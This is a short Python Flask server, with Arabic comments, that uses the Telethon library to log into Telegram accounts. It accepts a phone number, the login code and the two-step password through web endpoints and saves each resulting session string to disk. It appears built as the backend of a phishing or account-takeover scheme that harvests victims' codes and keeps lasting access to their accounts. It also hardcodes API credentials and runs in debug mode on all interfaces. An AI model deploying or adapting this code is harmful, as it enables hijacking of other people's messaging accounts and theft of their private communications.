from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import os

api_id = 23622886  # ضع API ID من my.telegram.org
api_hash = '1839459389acd1b58db1763627575be0'  # ضع API HASH من my.telegram.org

app = Flask(__name__)
SESSION_DIR = 'sessions'
os.makedirs(SESSION_DIR, exist_ok=True)

clients = {}

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'Phone number required'}), 400

    client = TelegramClient(StringSession(), api_id, api_hash)
    client.connect()
    clients[phone] = client

    try:
        client.send_code_request(phone)
        return jsonify({'status': 'code_sent'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    if not all([phone, code]):
        return jsonify({'error': 'Phone and code required'}), 400

    client = clients.get(phone)
    if not client:
        return jsonify({'error': 'No session found'}), 400

    try:
        client.sign_in(phone, code)
        string = client.session.save()
        save_path = os.path.join(SESSION_DIR, f"{phone}.session")
        with open(save_path, "w") as f:
            f.write(string)
        return jsonify({'status': 'login_successful'})
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            return jsonify({'status': 'need_password'})
        return jsonify({'error': str(e)}), 500

@app.route('/verify-password', methods=['POST'])
def verify_password():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    if not all([phone, password]):
        return jsonify({'error': 'Phone and password required'}), 400

    client = clients.get(phone)
    if not client:
        return jsonify({'error': 'No session found'}), 400

    try:
        client.sign_in(password=password)
        string = client.session.save()
        save_path = os.path.join(SESSION_DIR, f"{phone}.session")
        with open(save_path, "w") as f:
            f.write(string)
        return jsonify({'status': 'login_successful'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=10000)
